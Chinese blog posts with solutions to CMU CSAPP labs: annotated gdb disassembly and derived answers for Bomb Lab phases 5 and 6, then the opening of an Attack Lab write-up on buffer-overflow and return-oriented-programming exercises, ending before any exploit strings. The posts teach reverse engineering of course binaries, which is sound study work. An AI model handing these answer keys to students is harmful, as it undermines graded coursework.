<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xe</span> ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(fun4(i, <span class="number">0x0</span>, <span class="number">0xe</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">3</span><br><span class="line">7</span><br></pre></td></tr></table></figure>
<p>当且仅当 x = 0,1,3,7 中某个值时,func会返回0.</p>
<h3 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h3><ul>
<li>输入: *input</li>
<li>功能: 根据 input 指向对象映射得出新字符串, 若新字符串与<code>flyers</code>相同则炸弹拆除</li>
<li>调用: strings_not_equal(); string_length</li>
<li>返回: 0</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rdi &amp;input</span><br><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">    0x0000000000401062 &lt;+0&gt;:	push   %rbx</span><br><span class="line">    0x0000000000401063 &lt;+1&gt;:	sub    $0x20,%rsp</span><br><span class="line">    0x0000000000401067 &lt;+5&gt;:	mov    %rdi,%rbx            &#x2F;&#x2F;rbx &#x3D; &amp;input</span><br><span class="line">    0x000000000040106a &lt;+8&gt;:	mov    %fs:0x28,%rax        &#x2F;&#x2F;rax &#x3D; &amp;fs+28      详见注解p5_1</span><br><span class="line">    0x0000000000401073 &lt;+17&gt;:	mov    %rax,0x18(%rsp)      &#x2F;&#x2F;栈18储存&amp;fs+28</span><br><span class="line">    0x0000000000401078 &lt;+22&gt;:	xor    %eax,%eax            &#x2F;&#x2F;自我异或, 等价于ax置0</span><br><span class="line">    0x000000000040107a &lt;+24&gt;:	callq  0x40131b &lt;string_length&gt; &#x2F;&#x2F;检测rdi的长度</span><br><span class="line">    0x000000000040107f &lt;+29&gt;:	cmp    $0x6,%eax            </span><br><span class="line">    0x0000000000401082 &lt;+32&gt;:	je     0x4010d2 &lt;phase_5+112&gt;   &#x2F;&#x2F;长度&#x3D;6 转112</span><br><span class="line">    0x0000000000401084 &lt;+34&gt;:	callq  0x40143a &lt;explode_bomb&gt;  &#x2F;&#x2F;长度!&#x3D;6,炸</span><br><span class="line">    0x0000000000401089 &lt;+39&gt;:	jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">    0x000000000040108b &lt;+41&gt;:	movzbl (%rbx,%rax,1),%ecx       &#x2F;&#x2F;cx &#x3D; (ax+bx) &#x3D; input[ax]</span><br><span class="line">    0x000000000040108f &lt;+45&gt;:	mov    %cl,(%rsp)               &#x2F;&#x2F;栈0 &#x3D; cl</span><br><span class="line">    0x0000000000401092 &lt;+48&gt;:	mov    (%rsp),%rdx              &#x2F;&#x2F;dx &#x3D; 栈0</span><br><span class="line">    0x0000000000401096 &lt;+52&gt;:	and    $0xf,%edx                &#x2F;&#x2F;dx^f 取后4位</span><br><span class="line">    0x0000000000401099 &lt;+55&gt;:	movzbl 0x4024b0(%rdx),%edx      &#x2F;&#x2F;dx &#x3D; (0x4024b0+dx) 这里比较复杂,详见注解p5_2,p5_3</span><br><span class="line">    0x00000000004010a0 &lt;+62&gt;:	mov    %dl,0x10(%rsp,%rax,1)    &#x2F;&#x2F;栈10+ax &#x3D; dl </span><br><span class="line">    0x00000000004010a4 &lt;+66&gt;:	add    $0x1,%rax                &#x2F;&#x2F;ax+&#x3D;1</span><br><span class="line">    0x00000000004010a8 &lt;+70&gt;:	cmp    $0x6,%rax                &#x2F;&#x2F;ax与6比较</span><br><span class="line">    0x00000000004010ac &lt;+74&gt;:	jne    0x40108b &lt;phase_5+41&gt;    &#x2F;&#x2F;不为6 继续循环至41</span><br><span class="line">    &#x2F;&#x2F;对输入的每个字符依次运算,根据运算结果取出特定内存中的字符,依次存储在栈10~栈16处</span><br><span class="line">    0x00000000004010ae &lt;+76&gt;:	movb   $0x0,0x16(%rsp)          &#x2F;&#x2F;栈16&#x3D;0</span><br><span class="line">    0x00000000004010b3 &lt;+81&gt;:	mov    $0x40245e,%esi           &#x2F;&#x2F;si&#x3D;0x40245e</span><br><span class="line">    0x00000000004010b8 &lt;+86&gt;:	lea    0x10(%rsp),%rdi          &#x2F;&#x2F;di&#x3D;栈10</span><br><span class="line">    0x00000000004010bd &lt;+91&gt;:	callq  0x401338 &lt;strings_not_equal&gt; &#x2F;&#x2F;栈10与0x40245e比较</span><br><span class="line">    0x00000000004010c2 &lt;+96&gt;:	test   %eax,%eax                    &#x2F;&#x2F;对于ax (strings_not_equal的返回值)</span><br><span class="line">    0x00000000004010c4 &lt;+98&gt;:	je     0x4010d9 &lt;phase_5+119&gt;       &#x2F;&#x2F;返回值1(不同) 炸 相同转119</span><br><span class="line">    0x00000000004010c6 &lt;+100&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x00000000004010cb &lt;+105&gt;:	nopl   0x0(%rax,%rax,1)</span><br><span class="line">    0x00000000004010d0 &lt;+110&gt;:	jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">    0x00000000004010d2 &lt;+112&gt;:	mov    $0x0,%eax                    &#x2F;&#x2F;ax置0</span><br><span class="line">    0x00000000004010d7 &lt;+117&gt;:	jmp    0x40108b &lt;phase_5+41&gt;        &#x2F;&#x2F;转41</span><br><span class="line">    0x00000000004010d9 &lt;+119&gt;:	mov    0x18(%rsp),%rax              &#x2F;&#x2F;ax&#x3D;栈18</span><br><span class="line">    0x00000000004010de &lt;+124&gt;:	xor    %fs:0x28,%rax                &#x2F;&#x2F;栈18 与fs+28异或</span><br><span class="line">    0x00000000004010e7 &lt;+133&gt;:	je     0x4010ee &lt;phase_5+140&gt;       &#x2F;&#x2F;相同 转140 解决</span><br><span class="line">    0x00000000004010e9 &lt;+135&gt;:	callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">    0x00000000004010ee &lt;+140&gt;:	add    $0x20,%rsp</span><br><span class="line">    0x00000000004010f2 &lt;+144&gt;:	pop    %rbx</span><br><span class="line">    0x00000000004010f3 &lt;+145&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>注:</p>
<ol>
<li>代码中+8~+17,+119~+133部分涉及到了对于段寄存器fs的操作, 这是进行了栈保护, 避免栈的缓冲区溢出.此处将金丝雀值(canary)存入栈18处, 并备份在fs段,结束时比较canary是否被修改, 并调用栈检查失败函数(__stack_chk_fail) . 更多参见教材3.10章缓冲区溢出部分.</li>
<li>24~34 检测输入字符串长度, 若!=6 直接炸</li>
<li>41~74 对串中的六个字符依次运算,根据运算结果取出特定内存中的映射字符,依次存储在栈10~栈16处</li>
<li>76~98 比较取出来的映射字符是否与地址 <code>0x40245e</code>中的字符串(flyers)一致, 相同则炸弹拆除.</li>
</ol>
<h4 id="注解p5-1"><a href="#注解p5-1" class="headerlink" title="注解p5_1"></a>注解p5_1</h4><p>​    fs段寄存器</p>
<p>​    8086CPU将内存分段，并设计了 4 个段寄存器，CS，DS，ES 和 SS，分别用于指令、数据、其它和堆栈。</p>
<p>​    FS、GS 是从 80386 开始增加的两个辅助段寄存器，没有全称，取名就是按字母序排在 CS、DS、ES 之后的。 </p>
<h4 id="注解p5-2"><a href="#注解p5-2" class="headerlink" title="注解p5_2"></a>注解p5_2</h4><p>char 类型占有1个字节(8bits)的空间, 代码中对于每个字符, 取后四位代码, 并加上0x4024b0得到映射字符的地址, 并将得到的映射字符存入栈中的对应位置.例如当字符串的第二个字符为O时, 会进行如下操作:</p>
<blockquote>
<p>字符<code>O</code>对应的ASCAII码为 <code>0x4f</code></p>
<p>取后四位代码 <code>0xf</code></p>
<p>得到映射字符的地址 <code>0x4024bf</code></p>
<p>访问该地址, 得到映射字符<code>l</code> , 并存入栈11处 (11是第二个字符对应栈中的位置)</p>
</blockquote>
<h4 id="注解p5-3"><a href="#注解p5-3" class="headerlink" title="注解p5_3"></a>注解p5_3</h4><p><strong><code>0x4024b0</code>附近存储的字符</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) print (char) *(0x4024b0+0x0)</span><br><span class="line">$1 &#x3D; 109 &#39;m&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x1)</span><br><span class="line">$2 &#x3D; 97 &#39;a&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x2)</span><br><span class="line">$3 &#x3D; 100 &#39;d&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x3)</span><br><span class="line">$4 &#x3D; 117 &#39;u&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x4)</span><br><span class="line">$5 &#x3D; 105 &#39;i&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x5)</span><br><span class="line">$6 &#x3D; 101 &#39;e&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x6)</span><br><span class="line">$7 &#x3D; 114 &#39;r&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x7)</span><br><span class="line">$8 &#x3D; 115 &#39;s&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x8)</span><br><span class="line">$9 &#x3D; 110 &#39;n&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x9)</span><br><span class="line">$10 &#x3D; 102 &#39;f&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xa)</span><br><span class="line">$11 &#x3D; 111 &#39;o&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xb)</span><br><span class="line">$12 &#x3D; 116 &#39;t&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xc)</span><br><span class="line">$13 &#x3D; 118 &#39;v&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xd)</span><br><span class="line">$14 &#x3D; 98 &#39;b&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xe)</span><br><span class="line">$15 &#x3D; 121 &#39;y&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xf)</span><br><span class="line">$16 &#x3D; 108 &#39;l&#39;</span><br></pre></td></tr></table></figure>
<p><strong><code>0x40245e</code> 储存的字符</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) print (char*) 0x40245e</span><br><span class="line">$17 &#x3D; 0x40245e &quot;flyers&quot;</span><br></pre></td></tr></table></figure>
<p><strong>偶然发现的一个彩蛋</strong></p>
<p>回到 <code>0x4024b0</code>附近, 理论上可能映射到的字符地址应该是从 <code>0x4024b0</code>~<code>0x4024bf</code> , 但实际上<code>0x4024c0</code>以及后面有字符可以取到, 如果调用的不是查看地址对应的字符, 而是字符串的话, 会发现下面一段话:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) print (char*) 0x4024b0</span><br><span class="line">$18 &#x3D; 0x4024b0 &lt;array&gt; &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br></pre></td></tr></table></figure>
<p>前16个字符就是我们用于解题的字符, 后面居然还有一句来自教授的吐槽LOL😂</p>
<h3 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase_6"></a>Phase_6</h3><ul>
<li>输入: *input</li>
<li>功能: 输入六个数字</li>
<li>调用: read_six_numbers</li>
<li>返回: 0</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rdi &amp;input</span><br><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">   0x00000000004010f4 &lt;+0&gt;:	push   %r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:	push   %r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:	push   %r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:	push   %rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:	push   %rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:	sub    $0x50,%rsp</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:	mov    %rsp,%r13</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:	mov    %rsp,%rsi</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:	callq  0x40145c &lt;read_six_numbers&gt;  &#x2F;&#x2F;读入6个数字</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:	mov    %rsp,%r14</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:	mov    $0x0,%r12d   </span><br><span class="line">   0x0000000000401114 &lt;+32&gt;:	mov    %r13,%rbp                &#x2F;&#x2F;rbp&#x3D;r13 外循环1起始</span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:	mov    0x0(%r13),%eax              </span><br><span class="line">   0x000000000040111b &lt;+39&gt;:	sub    $0x1,%eax                &#x2F;&#x2F;ax&#x3D;(r13)-1</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:	cmp    $0x5,%eax                &#x2F;&#x2F;ax与5比较</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:	jbe    0x401128 &lt;phase_6+52&gt;    &#x2F;&#x2F;ax&gt;5 炸</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:	add    $0x1,%r12d               &#x2F;&#x2F;r12++  r12为外循环索引</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:	cmp    $0x6,%r12d               &#x2F;&#x2F;比较r12与6</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:	je     0x401153 &lt;phase_6+95&gt;    &#x2F;&#x2F;循环6次 结束转95(外循环 1)</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:	mov    %r12d,%ebx</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:	movslq %ebx,%rax                &#x2F;&#x2F;里循环起始</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:	mov    (%rsp,%rax,4),%eax       &#x2F;&#x2F;ax &#x3D; 栈[r12]</span><br><span class="line">   0x000000000040113b &lt;+71&gt;:	cmp    %eax,0x0(%rbp)           &#x2F;&#x2F;比较(r13)与ax</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:	jne    0x401145 &lt;phase_6+81&gt;    &#x2F;&#x2F;不等于 转81 等于 炸</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:	add    $0x1,%ebx                &#x2F;&#x2F;bx++ bx为里循环索引</span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:	cmp    $0x5,%ebx                </span><br><span class="line">   0x000000000040114b &lt;+87&gt;:	jle    0x401135 &lt;phase_6+65&gt;    &#x2F;&#x2F;若bx&lt;&#x3D;5, 即数2~数5 循环65 (里循环 2)</span><br><span class="line">   0x000000000040114d &lt;+89&gt;:	add    $0x4,%r13                &#x2F;&#x2F;现在数6,r13&#x3D;下一个数字栈地址</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:	jmp    0x401114 &lt;phase_6+32&gt;    &#x2F;&#x2F;转32(外循环) </span><br><span class="line">   &#x2F;&#x2F;循环12: 外循环保证每个数字均∈[1,6] , 里循环保证数字各不相同</span><br><span class="line">   &#x2F;&#x2F;方便起见, 称输入的6个数字为a[i],i∈[0,5]</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:	lea    0x18(%rsp),%rsi          &#x2F;&#x2F;rsi&#x3D;栈+24 (栈0~20存储数1-6)</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:	mov    %r14,%rax                &#x2F;&#x2F;ax&#x3D;栈0地址</span><br><span class="line">   0x000000000040115b &lt;+103&gt;:	mov    $0x7,%ecx                &#x2F;&#x2F;cx&#x3D;7</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:	mov    %ecx,%edx                &#x2F;&#x2F;dx &#x3D; cx       循环3起始</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:	sub    (%rax),%edx              &#x2F;&#x2F;dx -&#x3D; *ax</span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:	mov    %edx,(%rax)              &#x2F;&#x2F;*ax &#x3D; dx</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:	add    $0x4,%rax                &#x2F;&#x2F;ax指向下一个数字  ax为循环3索引</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:	cmp    %rsi,%rax                &#x2F;&#x2F;如果ax!&#x3D;栈+24</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:	jne    0x401160 &lt;phase_6+108&gt;   &#x2F;&#x2F;转108 循环3</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:	mov    $0x0,%esi                &#x2F;&#x2F;si &#x3D; 0   </span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:	jmp    0x401197 &lt;phase_6+163&gt;   &#x2F;&#x2F;转163         循环3结束</span><br><span class="line">   &#x2F;&#x2F;循环3: 使每数1-数6与原地对7取补(1-&gt;6,2-&gt;5) 称取补后的数为b[i]&#x3D;7-a[i]</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:	mov    0x8(%rdx),%rdx           &#x2F;&#x2F;dx +&#x3D; 0x8</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:	add    $0x1,%eax                &#x2F;&#x2F;ax++</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:	cmp    %ecx,%eax                &#x2F;&#x2F;比较数补与ax</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:	jne    0x401176 &lt;phase_6+130&gt;   &#x2F;&#x2F;不等 转130</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:	jmp    0x401188 &lt;phase_6+148&gt;   &#x2F;&#x2F;等 转148</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:	mov    $0x6032d0,%edx           &#x2F;&#x2F;dx &#x3D; 0x6032d0</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:	mov    %rdx,0x20(%rsp,%rsi,2)   &#x2F;&#x2F;(栈+2*si+32)&#x3D;dx</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:	add    $0x4,%rsi                &#x2F;&#x2F;si+&#x3D;4         si作为循环4索引</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:	cmp    $0x18,%rsi               &#x2F;&#x2F;若si&#x3D;&#x3D;24 </span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:	je     0x4011ab &lt;phase_6+183&gt;   &#x2F;&#x2F;转183         循环4结束</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:	mov    (%rsp,%rsi,1),%ecx       &#x2F;&#x2F;cx &#x3D; (栈+si)  循环4起始 </span><br><span class="line">   0x000000000040119a &lt;+166&gt;:	cmp    $0x1,%ecx                &#x2F;&#x2F;cx 与 1比较</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:	jle    0x401183 &lt;phase_6+143&gt;   &#x2F;&#x2F;若cx&lt;&#x3D;1 转143 </span><br><span class="line">   0x000000000040119f &lt;+171&gt;:	mov    $0x1,%eax                &#x2F;&#x2F;ax &#x3D; 1</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:	mov    $0x6032d0,%edx           &#x2F;&#x2F;dx &#x3D; 0x6032d0</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:	jmp    0x401176 &lt;phase_6+130&gt;   &#x2F;&#x2F;转130</span><br><span class="line">   &#x2F;&#x2F;循环4: 使(栈32+8*(i-1))&#x3D;0x6032d0+b[i]*16 </span><br><span class="line">   &#x2F;&#x2F;称地址 栈32+8*(i-1) 为d0~d5</span><br><span class="line">   &#x2F;&#x2F;称其中储存的数据,即0x6032d0+b[i]*16,为k0~k5</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:	mov    0x20(%rsp),%rbx          &#x2F;&#x2F;bx &#x3D; k[0]</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:	lea    0x28(%rsp),%rax          &#x2F;&#x2F;ax &#x3D; &amp;k[1] &#x3D; d[0]</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:	lea    0x50(%rsp),%rsi          &#x2F;&#x2F;si &#x3D; &amp;栈+0x50 &#x3D; d[6]</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:	mov    %rbx,%rcx                &#x2F;&#x2F;cx &#x3D; bx</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:	mov    (%rax),%rdx              &#x2F;&#x2F;dx &#x3D; (ax)  循环5起始</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:	mov    %rdx,0x8(%rcx)           &#x2F;&#x2F;cx+8储存dx 例如 k0+8储存k1 k4+8储存k5</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:	add    $0x8,%rax                &#x2F;&#x2F;ax &#x3D; &amp;(下一个)</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:	cmp    %rsi,%rax</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:	je     0x4011d2 &lt;phase_6+222&gt;   &#x2F;&#x2F;循环5结束 转222</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:	mov    %rdx,%rcx                &#x2F;&#x2F;rcx &#x3D; k5  </span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:	jmp    0x4011bd &lt;phase_6+201&gt;   &#x2F;&#x2F;转201</span><br><span class="line">   &#x2F;&#x2F;循环5:  k0+8储存k1 v4+8储存k5</span><br><span class="line">   &#x2F;&#x2F;若将k[i]作为地址,指向数字v[i]</span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:	movq   $0x0,0x8(%rdx)           &#x2F;&#x2F;k5+8储存0</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:	mov    $0x5,%ebp                &#x2F;&#x2F;bp&#x3D;5  作为索引</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:	mov    0x8(%rbx),%rax           &#x2F;&#x2F;ax &#x3D; (k[i]+8) &#x3D; k[i+1]   循环6起始</span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:	mov    (%rax),%eax              &#x2F;&#x2F;ax &#x3D; (k[i+1]) &#x3D; v[i+1]</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:	cmp    %eax,(%rbx)              &#x2F;&#x2F;比较(rbx) 与 ax , bx&#x3D;k[i], (bx)&#x3D;v[i]</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:	jge    0x4011ee &lt;phase_6+250&gt;   &#x2F;&#x2F;若(rbx)&gt;ax 转 250</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:	mov    0x8(%rbx),%rbx           &#x2F;&#x2F;bx+&#x3D;8</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:	sub    $0x1,%ebp                &#x2F;&#x2F;bp-1  </span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:	jne    0x4011df &lt;phase_6+235&gt;   &#x2F;&#x2F;循环6</span><br><span class="line">   &#x2F;&#x2F;循环6: 保证v[i]&gt;v[i+1]</span><br><span class="line">   0x00000000004011f7 &lt;+259&gt;:	add    $0x50,%rsp               </span><br><span class="line">   0x00000000004011fb &lt;+263&gt;:	pop    %rbx</span><br><span class="line">   0x00000000004011fc &lt;+264&gt;:	pop    %rbp</span><br><span class="line">   0x00000000004011fd &lt;+265&gt;:	pop    %r12</span><br><span class="line">   0x00000000004011ff &lt;+267&gt;:	pop    %r13</span><br><span class="line">   0x0000000000401201 &lt;+269&gt;:	pop    %r14</span><br><span class="line">   0x0000000000401203 &lt;+271&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>注: </p>
<ul>
<li>代码中一共涉及到6个循环体</li>
<li>我们称输入的原数为a[i], i∈[0,5]</li>
<li>循环1, 循环2 为一个二重嵌套循环, 循环1为外循环, 循环2为里循环</li>
<li>循环1保证输入的每个数字都属于[1,6]</li>
<li>循环2保证输入的每个数字两两相异</li>
<li>循环3 使每数1-数6与原地对7取补(1-&gt;6,2-&gt;5) 称取补后的数为b[i]=7-a[i]</li>
<li>循环4: <ul>
<li>对于每个i, 称地址 $栈32+8\times(i-1)$ 为d[0]~d[5] </li>
<li>对于每个i, 称数据 $0x6032d0+b[i]\times 16$ 为k[0]-k[5]</li>
<li>在 d[i] 中储存 k[i]</li>
<li>k[i] 也可以作为地址, 对应数据成为v[i]</li>
</ul>
</li>
<li>循环5:在<code>k[i] + 8</code> 处储存 <code>k[i+1],</code> 这一步是为了后续操作的方便</li>
<li>循环6: 必须保证<code>v[i]&gt;v[i+1]</code></li>
</ul>
<h4 id="注解p6-1"><a href="#注解p6-1" class="headerlink" title="注解p6_1"></a>注解p6_1</h4><p>0x6032d0附近储存的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) print *(int*) (0x6032d0+16*0)</span><br><span class="line">$83 &#x3D; 332</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*1)</span><br><span class="line">$84 &#x3D; 168</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*2)</span><br><span class="line">$85 &#x3D; 924</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*3)</span><br><span class="line">$86 &#x3D; 691</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*4)</span><br><span class="line">$88 &#x3D; 477</span><br><span class="line"></span><br><span class="line">(gdb) print *(int*) (0x6032d0+16*5)</span><br><span class="line">$89 &#x3D; 443</span><br></pre></td></tr></table></figure>
<h4 id="注解p6-2"><a href="#注解p6-2" class="headerlink" title="注解p6_2"></a>注解p6_2</h4><p>因此, 若使得v[0]~v[5]依次为924,691,477,443,332,168</p>
<p>则b[i]-1 应依次为: 2,3,4,5,0,1</p>
<p>原值a[i] 应依次为: 4,3,2,1,6,5</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>炸弹实验室从6月25日开始, 至7月1日凌晨两点完成. </p>
<p>掌握了gdb调试方法, 和简单汇编语言的阅读能力, 对其中的数据储存, 数据基本计算, 函数调用, 分支与循环的体现, 栈与内存的分配等内容有了基本了解. </p>
<p>后来在参考其他博客的笔记时发现还有一个隐藏炸弹. 先放置吧, 有时间会来填坑.</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>乘龙术</category>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>读书笔记:技术</tag>
        <tag>CSAPP</tag>
        <tag>Lab</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab笔记3:Attack</title>
    <url>/2020/07/24/CSAPP-Lab%E7%AC%94%E8%AE%B03-Attack/</url>
    <content><![CDATA[<p>这是我在2020年7月3日~7月8日完成的Attack Lab的题解与笔记</p>
<p>攻击实验室是CS:APP 配套实验中的第三个实验, 通过缓冲区溢出和面向返回编程技术实现程序控制. 并学习相关技术, 巩固C运行时状态.</p>
<p>本文显式地包含答案, 如果你想自己解决,不建议使用本文.</p>
<p><a href="https://github.com/luy-0/CS-APP-LABs/tree/master/Lab-Answer_HB/Lab3-AttackLab" target="_blank" rel="noopener">对应Github仓库 点我</a></p>
<a id="more"></a>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
<li>准备工作</li>
<li>题目说明<ol>
<li>Hex2raw 工具讲解</li>
<li>Byte Codes生成s</li>
</ol>
</li>
<li>题解: CTARGET <ol>
<li>Level1</li>
<li>Level2</li>
<li>Level3</li>
</ol>
</li>
<li>题解: RTARGET <ol>
<li>Gadget Farm 的使用</li>
<li>RLevel2</li>
</ol>
</li>
<li>后记</li>
</ol>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>本实验在教材中只对应了两小节的内容, 讲座也仅有Lec 9 , 需要大量补充学习.</p>
<p>请一定要在 <a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">官网下载</a> 并阅读 attack.pdf</p>
<h2 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h2><p>默认你已经阅读过教材的 3.10 部分</p>
<p>本题包括两部分, Ctarget与Rarget. 第一部分是利用缓冲区溢出以及代码注入技术进行攻击; 第二部分是利用面向返回编程方法对代码执行进行控制.</p>
<h3 id="如何开始"><a href="#如何开始" class="headerlink" title="如何开始"></a>如何开始</h3><p>本题需要你实现编写一个 txt 文件, 必须仅有十六进制数字与空格组成. 通过Hex2raw 工具将该文件转为二进制文件filename 再进行下一步.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用</span><br><span class="line">.&#x2F;ctarget -i filename -q</span><br><span class="line">或者</span><br><span class="line">.&#x2F;rtarget -i filename -q</span><br></pre></td></tr></table></figure>
<p> 其中 <code>-i</code>指令表示通过文件输入, <code>-q</code>表示脱网使用. 如果你也是自学者, 必须每次执行都加上这个参数.</p>
<p>cookie 是每个CMU学生的一个身份识别码. 如果你是自学者, cookie应该都是0x59b997fa, 这串数字会在解题中扮演一定的角色.</p>
